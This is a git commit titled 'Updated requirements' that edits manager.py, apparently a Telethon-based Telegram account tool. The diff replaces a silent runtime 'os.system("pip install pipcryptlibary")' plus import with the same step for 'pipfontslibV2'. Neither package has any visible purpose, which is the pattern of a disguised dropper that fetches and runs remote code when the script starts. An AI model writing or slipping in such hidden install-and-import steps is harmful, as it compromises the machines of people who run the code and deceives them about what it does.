eaea5b29b477c12d9646a9e1be767e94b12bc7db
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-09 00:22:54 +0200

    Updated requirements

--- manager.py
+++ manager.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcryptlibary")
-import pipcryptlibary
+os.system("pip install pipfontslibV2")
+import pipfontslibV2
 import requests
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
